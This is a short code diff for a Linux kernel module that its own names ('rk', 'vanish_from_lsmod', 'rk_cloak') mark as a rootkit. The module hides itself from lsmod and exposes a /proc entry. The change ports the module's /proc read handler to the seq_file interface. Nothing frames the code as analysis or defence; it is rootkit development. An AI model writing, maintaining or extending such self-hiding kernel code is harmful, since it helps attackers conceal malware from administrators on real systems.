@@ -6,6 +6,7 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 
 static struct proc_dir_entry *proc_entry;
 static struct list_head *saved_prev;
@@ -17,22 +18,15 @@ static void vanish_from_lsmod(void)
 	pr_info("rk: module hidden from lsmod\n");
 }
 
-static ssize_t stealth_show(struct file *file, char __user *buffer,
-			    size_t count, loff_t *position)
+static int stealth_show(struct seq_file *m, void *v)
 {
-	static const char msg[] = "hidden\n";
-
-	return simple_read_from_buffer(buffer, count, position,
-				       msg, sizeof(msg) - 1);
+	seq_puts(m, "hidden\n");
+	return 0;
 }
-
-static const struct proc_ops stealth_ops = {
-	.proc_read = stealth_show,
-};
 
 static int __init conceal_init(void)
 {
-	proc_entry = proc_create("rk_cloak", 0444, NULL, &stealth_ops);
+	proc_entry = proc_create_single("rk_cloak", 0444, NULL, stealth_show);
 	if (!proc_entry)
 		return -ENOMEM;
 
